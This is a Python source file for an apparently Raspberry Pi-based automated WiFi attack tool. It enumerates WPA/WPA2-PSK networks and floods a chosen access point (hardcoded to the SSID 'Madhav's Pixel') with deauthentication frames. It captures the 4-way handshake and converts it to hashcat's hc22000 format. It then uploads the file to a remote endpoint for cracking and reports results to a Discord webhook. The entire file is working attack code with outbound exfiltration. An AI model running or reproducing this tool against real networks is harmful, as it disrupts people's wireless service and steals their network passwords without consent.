from scapy.all import *
from threading import Thread, Event
import time
import os
import json
import sys
import requests
from dhooks import Webhook

MON_IFACE = sys.argv[1]
ENDPOINT = "http://192.168.1.10:5000/send" # endpoint URL
networks = []
stations = []
WEBHOOK_URL = "" # discord webhook url

current_ap_mac = ""
captured = False
DS_FLAG = 0b11
TO_DS = 0b01
addr1_ap = 0
addr2_ap = 0

handshake_stations = set()

def write_networks():
    global networks
    # Write networks to a json file to use later
    f = open("wifinetworks.json", "w")
    json_obj = json.dumps(networks, indent=4)
    f.write(json_obj)
    f.close()

def ap_enumeration(packet):
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2
        ap = packet[Dot11].addr3
        ssid = packet[Dot11Elt].info.decode()

        if ssid == "" or ssid is None:
            return
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        stats = packet[Dot11Beacon].network_stats()
        channel = stats.get("channel")
        crypto = stats.get("crypto")
        if ("WPA/PSK" in crypto or "WPA2/PSK" in crypto):
            data = {"ssid": ssid, "bssid": bssid, "channel": channel, "crypto": list(crypto)}
            networks.append(data)

def wpa_handshake(packet):
    global current_ap_mac
    global captured
    global TO_DS
    global addr1_ap
    global addr2_ap
    pktdump = PcapWriter("tmp/handshake.pcap", append=True, sync=True)
    captured = False
    pktdump.write(packet)
    if (EAPOL in packet) or (packet.haslayer(EAP)):
        addr1 = str(packet.addr1)
        addr2 = str(packet.addr2)

        if addr1 == current_ap_mac:
            addr1_ap += 1
        elif addr2 == current_ap_mac:
            addr2_ap += 1

    if addr1_ap >= 2 and addr2_ap >= 2:
        captured = True
        return captured

    return captured

def deauth(ap_mac, station_mac, channel, stop):
    global MON_IFACE
    # Change channel ID
    os.system(f"sudo iwconfig {MON_IFACE} channel {channel}")

    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac,
                                addr3=ap_mac) / Dot11Deauth()
    time.sleep(1)
    # send the packet
    for i in range(1000):
        sendp(packet, iface=MON_IFACE, inter=0.2, verbose=0)
        if stop.is_set():
            break

def capture_handshake(ap_mac, channel):
    global captured
    global MON_IFACE
    os.system(f"sudo iwconfig {MON_IFACE} channel {channel}")
    sniff(iface=MON_IFACE, stop_filter=wpa_handshake, timeout=300)

    if not captured:
        # Sometimes eventhough the eapol packets are captured, it is not detected by scapy. So writing this aditional check just in case
        print("[?] Running additional check to see if WPA handshake is captured")
        handshake_cap = rdpcap('tmp/handshake.pcap')
        from_ap = 0
        to_ap = 0
        for packet in handshake_cap:
            if packet.haslayer(EAPOL):
                addr1 = packet.addr1
                addr2 = packet.addr2

                if addr1 == ap_mac:
                    from_ap += 1
                elif addr2 == ap_mac:
                    to_ap += 1

        if from_ap >= 2 and to_ap >= 2:
            captured = True

    if captured:
        ap_mac_formatted = ap_mac.replace(":", "-")
        filename = f"handshake_{ap_mac_formatted}.pcap"
        print(f"\r4-way handshake captured for ap [{ap_mac}]")
        os.system(f"mv tmp/handshake.pcap handshakes/handshake_{ap_mac_formatted}.pcap")
        print(f"\rSaved in file handshake_{ap_mac_formatted}.pcap")
        return filename
    else:
        print(f"\rUnable to capture handshake for ap [{ap_mac}]")
        return None

def change_channel():
    global MON_IFACE
    ch = 1
    while True:
        os.system(f"iwconfig {MON_IFACE} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)


def send_to_webhook(message):
    global WEBHOOK_URL
    webhook = Webhook(WEBHOOK_URL)
    for i in range(50):
        try:
            webhook.send(message)
            print("[+] Sent newly discovered networks to discord")
            return
        except Exception as e:
            pass


def send_to_endpoint(f, hc22000_filename):
    for i in range(50):
        try:
            r = requests.post(ENDPOINT, files={hc22000_filename: f})
            if r.status_code == 200:
                print("[+] Sent the hc22000 file to endpoint.")
                return
        except Exception as e:
            continue

def start():
    global networks
    global deauth_tried_aps
    global addr1_ap
    global addr2_ap
    global captured
    global current_ap_mac

    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # start sniffing
    print("\n[*] Enumerating WiFi networks")
    sniff(prn=ap_enumeration, iface=MON_IFACE, timeout=60)

    # Remove dupilicates
    networks = [i for n, i in enumerate(networks) if i not in networks[n + 1:]]

    print("Networks: ", networks)

    # Notify about newly discovered networks
    if os.path.exists("wifinetworks.json"):
        new_networks = []
        with open("wifinetworks.json", "r") as f:
            data = f.read()
            try:
                data = json.loads(data)
                print("\nComparing bssids")
                for current_network in networks:
                    print("Current: ", current_network['bssid'])
                    already_saved = False
                    for already_saved_network in data:
                        print("Already saved: ", already_saved_network['bssid'])
                        if current_network['bssid'].strip() == already_saved_network['bssid'].strip():
                            already_saved = True
                            break

                    if not already_saved:
                        new_networks.append(current_network)

            except Exception as e:
                new_networks = networks

        if len(new_networks) != 0:
            print("New Networks: ", new_networks)
            # Send to webhook on a different thread
            message = "[From RasberryPi] New WiFi Networks discovered: \n"
            to_send = json.dumps(new_networks, indent=4)
            message += f"```{to_send}```"
            send_to_webhook(message)

    # Write networks to file
    print("[+] Writing found networks to file")
    write_networks()

    f = open("wifinetworks.json", 'r')
    wifi_networks = json.loads(f.read())
    f.close()

    threads = []
    deauth_tried_aps = []
    for net in wifi_networks:
        if net['ssid'] == "Madhav's Pixel": # attack only a single network to speed up the process.
            # re-initialize necessary variables
            addr1_ap = 0
            addr2_ap = 0
            captured = False
            skip = False
            ap_mac = net['bssid']
            station_mac = "xxx"
            channel = net['channel']
            ssid = net['ssid']

            if os.path.exists("captured_handshakes.json"):
                # Check if handshake is already captured
                with open("captured_handshakes.json", "r") as f:
                    data = f.readlines()
                    for line in data:
                        if line == "":
                            continue
                        if ap_mac.lower() == line.strip().lower():
                            skip = True
                            break

            if skip:
                continue

            current_ap_mac = ap_mac
            event = Event()

            # Perform deauth attack now in a different thread
            print(f"\n\n\r[*] Performing deauth attack on ap [{ssid}] [{ap_mac}] ...")
            deauther = Thread(target=deauth, args=(ap_mac, station_mac, channel, event))
            deauther.daemon = True
            deauther.start()

            time.sleep(0.1)

            # Listen for EAPOL packets (WPA handshake) in the main thread
            print("[*] Listening for WPA handshake")
            handshake_filename = capture_handshake(ap_mac, channel)
            event.set()
            deauther.join()

            if captured:
                # Notify
                message = "[From RaspberryPi] 4-way handshake captured for the following network: \n"
                message += f"```SSID: {ssid}, BSSID: {ap_mac}```"
                notifier = Thread(target=send_to_webhook, args=(message,))
                notifier.daemon = True
                notifier.start()

                # Add it to list of captured handshakes
                if not os.path.exists("captured_handshakes.json"):
                    os.system("touch captured_handshakes.json")

                with open("captured_handshakes.json", "a") as f:
                    f.write(ap_mac + "\n")

                # Convert cap file to hashcat compatabile format with hcxpcapngtool
                print("[+] Trying to convert handshakes to hc22000")
                hc22000_filename = ap_mac.replace(":", "") + ".hc22000"
                print(f"sudo hcxpcapngtool -o {hc22000_filename} {handshake_filename} >/dev/null 2>&1")
                os.system(f"sudo hcxpcapngtool -o hc22000/{hc22000_filename} handshakes/{handshake_filename} >/dev/null 2>&1")

                time.sleep(1)

                if not os.path.isfile(os.path.join("hc22000", hc22000_filename)):
                    print("[-] Unable to convert the handshake to hc22000. Please try again.")
                    continue

                print(f"[+] Converted handshake to hc22000 file hc22000/{hc22000_filename}")

                # Send to endpoint for cracking
                print(f"[+] Sending the file to endpoint [{ENDPOINT}]")
                with open(os.path.join("hc22000", hc22000_filename), 'rb') as f:
                    send_to_endpoint(f, hc22000_filename)


if __name__ == "__main__":
    try:
        print("[*] Restarting monitor mode.")
        os.system(f"airmon-ng stop {MON_IFACE}")
        time.sleep(3)
        os.system(f"airmon-ng start {MON_IFACE}")
        # enable_monitor_mode()
    except:
        print("[-] Unable to enable monitor mode. Please try again.")

    print("[+] Done.")

    if not os.path.exists("tmp"):
        os.mkdir("tmp")
        print("\n[*] Creating tmp directory.")
        print("[+] Done.")

    if not os.path.exists("handshakes"):
        os.mkdir("handshakes")
        print("\n[*] Creating handshakes directory.")
        print("[+] Done.")

    if not os.path.exists("hc22000"):
        os.mkdir("hc22000")
        print("\n[*] Creating hc22000 directory.")
        print("[+] Done.")

    while 1:
        start()
        time.sleep(60)
        print()
